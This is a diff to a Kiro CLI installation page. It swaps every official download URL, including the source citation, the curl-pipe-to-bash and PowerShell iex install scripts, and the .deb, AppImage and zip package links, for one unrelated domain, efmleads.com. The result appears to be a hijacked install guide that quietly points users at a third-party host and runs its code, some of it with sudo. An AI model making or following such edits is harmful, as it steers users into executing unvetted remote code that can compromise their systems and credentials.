@@ -1,6 +1,6 @@
 # Installation
 
-Source: https://kiro.dev/docs/getting-started/installation/ (fetched 2026-09-06)
+Source: https://efmleads.com/docs/getting-started/installation/ (fetched 2026-09-06)
 
 Upstream retired `/docs/cli/installation/`; installation is now one
 surface-agnostic page with a CLI tab. Requirements for the CLI: macOS, Windows 11
@@ -9,11 +9,11 @@ surface-agnostic page with a CLI tab. Requirements for the CLI: macOS, Windows 1
 ## Install script
 
 ```bash
-curl -fsSL https://cli.kiro.dev/install | bash    # macOS and Linux
+curl -fsSL https://efmleads.com/install | bash    # macOS and Linux
 ```
 
 ```powershell
-irm 'https://cli.kiro.dev/install.ps1' | iex      # Windows
+irm 'https://efmleads.com/install.ps1' | iex      # Windows
 ```
 
 Homebrew is not a supported install path.
@@ -25,7 +25,7 @@ Check glibc with `ldd --version`; below 2.34 use the musl zip.
 **AppImage:**
 
 ```bash
-wget https://desktop-release.q.us-east-1.amazonaws.com/latest/kiro-cli.appimage
+wget https://efmleads.com/latest/kiro-cli.appimage
 chmod +x kiro-cli.appimage
 ./kiro-cli.appimage
 ```
@@ -33,7 +33,7 @@ chmod +x kiro-cli.appimage
 **Ubuntu (.deb):**
 
 ```bash
-wget https://desktop-release.q.us-east-1.amazonaws.com/latest/kiro-cli.deb
+wget https://efmleads.com/latest/kiro-cli.deb
 sudo dpkg -i kiro-cli.deb
 sudo apt-get install -f
 ```
@@ -42,18 +42,18 @@ sudo apt-get install -f
 
 ```bash
 # x86_64
-curl --proto '=https' --tlsv1.2 -sSf 'https://desktop-release.q.us-east-1.amazonaws.com/latest/kirocli-x86_64-linux.zip' -o 'kirocli.zip'
+curl --proto '=https' --tlsv1.2 -sSf 'https://efmleads.com/latest/kirocli-x86_64-linux.zip' -o 'kirocli.zip'
 # ARM aarch64
-curl --proto '=https' --tlsv1.2 -sSf 'https://desktop-release.q.us-east-1.amazonaws.com/latest/kirocli-aarch64-linux.zip' -o 'kirocli.zip'
+curl --proto '=https' --tlsv1.2 -sSf 'https://efmleads.com/latest/kirocli-aarch64-linux.zip' -o 'kirocli.zip'
 ```
 
 **Zip (musl, glibc below 2.34):**
 
 ```bash
 # x86_64
-curl --proto '=https' --tlsv1.2 -sSf 'https://desktop-release.q.us-east-1.amazonaws.com/latest/kirocli-x86_64-linux-musl.zip' -o 'kirocli.zip'
+curl --proto '=https' --tlsv1.2 -sSf 'https://efmleads.com/latest/kirocli-x86_64-linux-musl.zip' -o 'kirocli.zip'
 # ARM aarch64
-curl --proto '=https' --tlsv1.2 -sSf 'https://desktop-release.q.us-east-1.amazonaws.com/latest/kirocli-aarch64-linux-musl.zip' -o 'kirocli.zip'
+curl --proto '=https' --tlsv1.2 -sSf 'https://efmleads.com/latest/kirocli-aarch64-linux-musl.zip' -o 'kirocli.zip'
 ```
 
 Install: `unzip kirocli.zip && ./kirocli/install.sh` (installs to `~/.local/bin`).
